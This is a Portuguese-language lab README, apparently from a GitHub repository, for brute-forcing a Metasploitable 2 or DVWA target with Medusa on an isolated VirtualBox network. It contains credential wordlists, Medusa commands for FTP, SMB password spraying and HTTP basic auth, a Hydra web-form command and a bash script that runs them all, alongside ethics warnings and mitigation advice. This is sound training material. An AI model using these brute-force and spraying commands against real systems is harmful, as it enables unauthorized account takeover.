# Kali + Medusa Brute‑Force Lab

**Propósito:** projeto prático para configurar um laboratório (Kali Linux + Metasploitable 2 / DVWA) e executar ataques controlados de força bruta com **Medusa**, documentando comandos, wordlists, resultados e recomendações de mitigação. **Uso somente em laboratório autorizado.**

---

## Sumário

1. Visão geral
2. Avisos legais e ética
3. Requisitos de software/hardware
4. Arquitetura da rede (VirtualBox)
5. Preparação das VMs
6. Wordlists (exemplos)
7. Testes práticos (FTP, web, SMB)
8. Scripts úteis (Bash)
9. Validação e logs
10. Recomendações de mitigação
11. Estrutura do repositório
12. Referências

---

## 1) Visão geral

Neste laboratório você irá:

* Preparar duas VMs (Kali e Metasploitable 2 ou DVWA) usando VirtualBox.
* Criar uma rede isolada (Host‑only ou Internal) para manter o tráfego em sandbox.
* Executar ataques de força bruta com Medusa contra serviços vulneráveis: FTP, autenticação HTTP (quando aplicável) e SMB (password spraying + enumeração de usuários).
* Registrar comandos, resultados e recomendações para mitigação.

---

## 2) Avisos legais e ética

**Somente** execute esses testes em ambientes que você possua ou tenha autorização explícita para testar (sua própria VMs de laboratório). Ataques a sistemas alheios sem permissão são ilegais.

Referências introdutórias e boas práticas também estão listadas nas Referências.

---

## 3) Requisitos

* Máquina host com VirtualBox instalado (versão compatível).
* Imagem Kali Linux (atualizada).
* Imagem Metasploitable 2 (ou máquina com DVWA instalada — pode usar OWASP Juice Shop, etc.).
* Acesso a internet apenas para baixar ISOs, depois colocar rede em isolamento.
* Ferramenta: `medusa` (já inclusa na maioria das imagens Kali). Verifique com `medusa -h`.

---

## 4) Arquitetura de rede (VirtualBox)

Recomenda-se usar *Host‑only Adapter* ou *Internal Network* para isolar o ambiente.

Exemplo de configuração (VirtualBox):

* VM Kali: adaptador 1 = Host‑only (vboxnet0)
* VM Metasploitable/DVWA: adaptador 1 = Host‑only (vboxnet0)

Verifique IPs com `ip a` (Kali) e `ifconfig`/`ip a` na Metasploitable.

---

## 5) Preparação das VMs

1. Inicie Metasploitable 2 (ou seu alvo) e confirme serviços em execução: `nmap -sV -p- <TARGET_IP>`.
2. Na Kali, atualize pacotes: `sudo apt update && sudo apt install medusa -y` (se não estiver presente).
3. Garanta que `medusa` é executável: `medusa -V` ou `medusa -h`.

---

## 6) Wordlists (exemplos simples)

Crie uma pasta `wordlists/` no repositório com arquivos pequenos para teste.

`wordlists/users.txt` (exemplo):

```
admin
user
test
guest
root
msfadmin
```

`wordlists/passwords-rockyou-small.txt` (exemplo curto):

```
password
123456
admin
12345
password1
qwerty
msfadmin
toor
```

**Observação:** estas wordlists são intencionais e pequenas — em um teste real você pode usar listas maiores (rockyou, etc.) mas lembre-se do impacto e da legalidade.

---

## 7) Testes práticos — comandos e exemplos

> **Nota:** substitua `<TARGET_IP>` por IP do alvo e adapte caminhos.

### 7.1. FTP (Metasploitable normalmente tem vsftpd)

Comando básico (arquivo de usuários e senhas):

```bash
medusa -M ftp -h <TARGET_IP> -U wordlists/users.txt -P wordlists/passwords-rockyou-small.txt -f -o results/medusa-ftp.txt
```

Explicação das flags úteis:

* `-M ftp` : módulo/protocolo FTP.
* `-h` : host alvo.
* `-U` : arquivo de usuários.
* `-P` : arquivo de senhas.
* `-f` : parar no primeiro sucesso por alvo (opcional).
* `-o` : output para arquivo (algumas versões de medusa suportam `-o` para arquivo; caso não, redirecione a saída `> results/...`).

Validação: se houver sucesso, medusa reportará a combinação usuário:senha; então você pode testar com `ftp <TARGET_IP>` ou `ftp -p <user> <TARGET_IP>` conforme apropriado.

**Exemplo de checagem manual:**

```bash
ftp <TARGET_IP>
# então inserir user e senha retornados
```

### 7.2. SMB — enumeração de usuários + password spraying

1. Enumere usuários de interesse (exemplo básico): se o alvo permitir, colete uma lista interna (ferramentas como `enum4linux`, `smbclient`, `rpcclient` ajudam). Exemplo rápido:

```bash
enum4linux -a <TARGET_IP> | tee results/enum4linux.txt
```

2. Password spraying com Medusa (varrer lista de usuários com poucas senhas comuns):

```bash
medusa -M smbnt -h <TARGET_IP> -U wordlists/users.txt -P wordlists/passwords-rockyou-small.txt -t 10 -f | tee results/medusa-smb.txt
```

> Observação: o módulo SMB pode variar por versão — `smbnt` é comumente presente; verifique `medusa -d` para listar módulos instalados e a sintaxe exata. citeturn0search1turn0search11

Validação: se medusa indicar credenciais válidas, teste com `smbclient -L //<TARGET_IP> -U <user>%<pass>`.

### 7.3. Web (DVWA) — automação de tentativas no formulário

* **Importante:** Medusa é excelente para protocolos com login de rede (FTP, SSH, SMB). Para formulários web complexos (POST forms com tokens, cookies), ferramentas como **Hydra** ou **Burp Intruder** costumam ser mais flexíveis. Ainda assim, Medusa pode realizar ataques contra HTTP basic auth e alguns formulários simples.

Exemplo para HTTP basic auth (se aplicável):

```bash
medusa -M http -h <TARGET_IP> -u admin -P wordlists/passwords-rockyou-small.txt -m AUTH:basic -f | tee results/medusa-http-basic.txt
```

Para formulários web (DVWA - login.php), alternativa recomendada:

* Use **Burp Suite** + Intruder for controlled web‑form bruteforce, ou
* Use **Hydra** (mais apropriado para web forms) — exemplo:

```bash
hydra -l admin -P wordlists/passwords-rockyou-small.txt <TARGET_IP> http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Incorrect" -V
```

(este comando é um exemplo ilustrativo; substitua a string de verificação `Incorrect` pelo texto real que aparece na página quando login falha.)

---

## 8) Scripts úteis

Crie `scripts/run-medusa-all.sh` para automatizar as tentativas:

```bash
#!/bin/bash
TARGET="$1"
OUTDIR="results/$(date +'%Y%m%d-%H%M%S')"
mkdir -p "$OUTDIR"

# FTP
medusa -M ftp -h "$TARGET" -U wordlists/users.txt -P wordlists/passwords-rockyou-small.txt -f > "$OUTDIR/medusa-ftp.txt" 2>&1

# SMB (spray)
medusa -M smbnt -h "$TARGET" -U wordlists/users.txt -P wordlists/passwords-rockyou-small.txt -t 8 -f > "$OUTDIR/medusa-smb.txt" 2>&1

# HTTP basic
medusa -M http -h "$TARGET" -u admin -P wordlists/passwords-rockyou-small.txt -m AUTH:basic -f > "$OUTDIR/medusa-http-basic.txt" 2>&1

echo "Resultados em: $OUTDIR"
```

Torne executável: `chmod +x scripts/run-medusa-all.sh` e execute: `./scripts/run-medusa-all.sh <TARGET_IP>`.

---

## 9) Validação e logging

* Guarde todas as saídas em `results/` com timestamps.
* Para cada credencial encontrada, valide manualmente (ex.: `ftp`, `smbclient`, browser para DVWA) e capture uma captura de tela (opcional) em `/images/` com nomes explicativos.
* Documente o tempo gasto, número de tentativas e threads (`-t`), e impacto observado.

---

## 10) Recomendações de mitigação

Resumo das melhores práticas para prevenção de força bruta:

* **Bloqueio temporário / rate limiting:** após N tentativas falhas bloquear IP ou exigir cooldown.
* **MFA:** autenticação multifator reduz risco.
* **Senhas fortes & políticas de complexidade:** evitar senhas fracas e reutilizadas.
* **Monitoramento e alertas:** detecção de anomalias no número de tentativas de login.
* **Account lockout com exceções de service accounts:** cuidado mútuo para evitar DoS por lockouts.
* **Segmentação de rede e firewalls:** limitar acessos a serviços sensíveis.

Referências e guias práticos estão na seção Referências.

---

## 11) Estrutura sugerida do repositório GitHub

```
Kali-Medusa-BruteForce-Lab/
├─ README.md              # este arquivo
├─ wordlists/
│  ├─ users.txt
│  └─ passwords-rockyou-small.txt
├─ scripts/
│  └─ run-medusa-all.sh
├─ results/               # gitignore recomendado; local only
└─ images/                # capturas de tela (opcional)
```

## 12) Referências

* Página do Medusa (man page e listagem de módulos) — medusa man page. 
* Página oficial / Kali tools (visão geral do Medusa no Kali). 
* Tutorial introdutório (FreeCodeCamp) sobre uso de Medusa. 
* Comparações e boas práticas (Hydra / Medusa / Ncrack) — HackerTarget. 
* Repositório e recurso histórico do autor (Foofus / GitHub). 

---

`wordlists/` e `scripts/`).

### `wordlists/users.txt`

```
admin
user
test
guest
root
msfadmin
backup
ftp
www-data
john
```

### `wordlists/passwords-rockyou-small.txt`

```
password
123456
admin
12345
password1
qwerty
msfadmin
toor
letmein
welcome
changeme
1234
12345678
passw0rd
```

### `scripts/run-medusa-all.sh`

```
#!/bin/bash
# run-medusa-all.sh
# Uso: ./run-medusa-all.sh <TARGET_IP>
# Exemplo: ./run-medusa-all.sh 192.168.56.101

set -euo pipefail
IFS=$'
	'

if [ "$#" -ne 1 ]; then
  echo "Uso: $0 <TARGET_IP>"
  exit 1
fi

TARGET="$1"
OUTDIR="results/$(date +'%Y%m%d-%H%M%S')"
mkdir -p "$OUTDIR"

echo "Alvo: $TARGET"
echo "Saída: $OUTDIR"

WORDLISTS_DIR="wordlists"
USERS_FILE="$WORDLISTS_DIR/users.txt"
PASS_FILE="$WORDLISTS_DIR/passwords-rockyou-small.txt"

if [ ! -f "$USERS_FILE" ] || [ ! -f "$PASS_FILE" ]; then
  echo "Arquivo de wordlists não encontrado. Verifique $USERS_FILE e $PASS_FILE"
  exit 2
fi

# FTP
echo "[+] Iniciando brute-force FTP..."
medusa -M ftp -h "$TARGET" -U "$USERS_FILE" -P "$PASS_FILE" -f > "$OUTDIR/medusa-ftp.txt" 2>&1 || true

# SMB (spray)
echo "[+] Iniciando password spraying SMB..."
medusa -M smbnt -h "$TARGET" -U "$USERS_FILE" -P "$PASS_FILE" -t 8 -f > "$OUTDIR/medusa-smb.txt" 2>&1 || true

# HTTP basic auth (se aplicável)
echo "[+] Testando HTTP basic auth (usuário: admin)..."
medusa -M http -h "$TARGET" -u admin -P "$PASS_FILE" -m AUTH:basic -f > "$OUTDIR/medusa-http-basic.txt" 2>&1 || true

# Sumário simples
echo "Resultados gravados em: $OUTDIR"
ls -l "$OUTDIR"

echo "[!] Lembre-se: valide manualmente cada credencial encontrada (ftp, smbclient, browser) e mantenha logs em local seguro."
```
Torne o script executável com:

```
chmod +x scripts/run-medusa-all.sh
```


